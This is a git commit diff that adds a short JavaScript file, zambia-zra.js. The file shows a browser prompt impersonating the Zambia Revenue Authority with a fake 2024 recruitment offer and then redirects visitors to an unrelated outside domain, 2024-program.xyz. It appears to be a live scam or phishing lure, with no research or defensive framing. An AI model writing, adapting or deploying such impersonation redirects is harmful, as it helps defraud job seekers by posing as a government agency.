a8251c29b1483bde7d9b11b917a50148879d266e
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-05-03 21:45:45 -0700

    Update and rename nsi_js.js to zambia-zra.js

---
+++ zambia-zra.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('ZRA: Hello Dear, Dont miss this 2024 Ongoing Zambia Revenue Authority Recuitment Kindly press 1 to start Application Now','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/zambiarevenue';
+}
